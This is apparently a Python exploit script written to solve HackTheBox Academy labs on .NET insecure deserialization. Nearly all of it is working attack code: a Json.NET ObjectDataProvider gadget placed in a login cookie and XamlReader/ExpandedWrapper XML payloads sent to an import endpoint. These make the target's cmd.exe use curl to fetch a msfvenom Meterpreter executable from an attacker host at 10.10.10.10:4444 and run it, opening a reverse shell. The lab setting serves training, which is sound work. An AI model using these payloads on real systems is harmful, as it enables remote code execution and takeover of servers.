#! /usr/bin/env python3

'''Created this script to solve the HackTheBox Academy lab called 'Example 1: JSON' and 'Example 2: XML' for the module called 'Advanced Deserialization Attacks'. 
This script exploits an insecure deserialization to get a reverse shell.

Before running the script do the following:
1. Create msfvenom shell using payload msfvenom/windows/x64/meterpreter/reverse_tcp.exe
2. Call the msfvenom shells msfvenom.exe and rev.exe
3. Run a python server to host the generated shell. 
4. Update the IP address and listening port in the payloads below
5. Run metasploit exploit handler listener with 'exploit -j' to catch the two different reverse shells
'''

import requests

target= "10.19.42.181:8000"
proxies= {"http":"http://127.0.0.1:8080"}
session= requests.session()
headers= {"Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0"
          }
data_login= f"username=pentest&password=pentest&rememberMe=on"
cookies= {"TTREMEMBER":'{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","ObjectType":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","MethodParameters":{"$type":"MS.Internal.Data.ParameterCollection, PresentationFramework","$values":["C:\\\\Windows\\\\System32\\\\cmd.exe","/c curl 10.10.10.10:4444/msfvenom.exe -o \\\\Users\\\\Public\\\\Documents\\\\msfvenom.exe && \\\\Users\\\\Public\\\\Documents\\\\msfvenom.exe"]},"MethodName":"Start"}'}

response= session.post(url=f"http://{target}/Auth/Login", proxies=proxies, headers=headers, cookies=cookies, data=data_login, verify=False, allow_redirects=True)

Data_Import_Tee=f'xml=<?xml%20version="1.0"?><Tee%20xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"%20xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance%20xsi:type="XamlReader"/><MethodName>Parse</MethodName><MethodParameters><anyType%20xsi:type="xsd:string">%26lt;ObjectDataProvider%20MethodName="Start"%20xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"%20xmlns:sd="clr-namespace:System.Diagnostics;assembly=System"%20xmlns:sc="clr-namespace:System.Collections;assembly=mscorlib"%20xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"%26gt;%26lt;ObjectDataProvider.ObjectInstance%26gt;%26lt;sd:Process%26gt;%26lt;sd:Process.StartInfo%26gt;%26lt;sd:ProcessStartInfo%20Arguments="/c%20curl%2010.10.10.10:4444/rev.exe%20-o%20\\Users\\Public\\Documents\\rev.exe"%20StandardErrorEncoding="{{x:Null}}"%20StandardOutputEncoding="{{x:Null}}"%20UserName=""%20Password="{{x:Null}}"%20Domain=""%20LoadUserProfile="False"%20FileName="C:\\Windows\\System32\\cmd.exe"%26gt;%26lt;/sd:ProcessStartInfo%26gt;%26lt;/sd:Process.StartInfo%26gt;%26lt;/sd:Process%26gt;%26lt;/ObjectDataProvider.ObjectInstance%26gt;%26lt;/ObjectDataProvider%26gt;</anyType></MethodParameters></ProjectedProperty0></Tee>&type=System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'

response2= session.post(url=f"http://{target}/Tees/Import", proxies=proxies, headers=headers, data=Data_Import_Tee, verify=False, allow_redirects=True)

Data_Import_Tee2=f'xml=<?xml%20version="1.0"?><Tee%20xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"%20xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance%20xsi:type="XamlReader"/><MethodName>Parse</MethodName><MethodParameters><anyType%20xsi:type="xsd:string">%26lt;ObjectDataProvider%20MethodName="Start"%20xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"%20xmlns:sd="clr-namespace:System.Diagnostics;assembly=System"%20xmlns:sc="clr-namespace:System.Collections;assembly=mscorlib"%20xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"%26gt;%26lt;ObjectDataProvider.ObjectInstance%26gt;%26lt;sd:Process%26gt;%26lt;sd:Process.StartInfo%26gt;%26lt;sd:ProcessStartInfo%20Arguments="/c%20\\Users\\Public\\Documents\\rev.exe"%20StandardErrorEncoding="{{x:Null}}"%20StandardOutputEncoding="{{x:Null}}"%20UserName=""%20Password="{{x:Null}}"%20Domain=""%20LoadUserProfile="False"%20FileName="C:\\Windows\\System32\\cmd.exe"%26gt;%26lt;/sd:ProcessStartInfo%26gt;%26lt;/sd:Process.StartInfo%26gt;%26lt;/sd:Process%26gt;%26lt;/ObjectDataProvider.ObjectInstance%26gt;%26lt;/ObjectDataProvider%26gt;</anyType></MethodParameters></ProjectedProperty0></Tee>&type=System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'

response3= session.post(url=f"http://{target}/Tees/Import", proxies=proxies, headers=headers, data=Data_Import_Tee2, verify=False, allow_redirects=True)
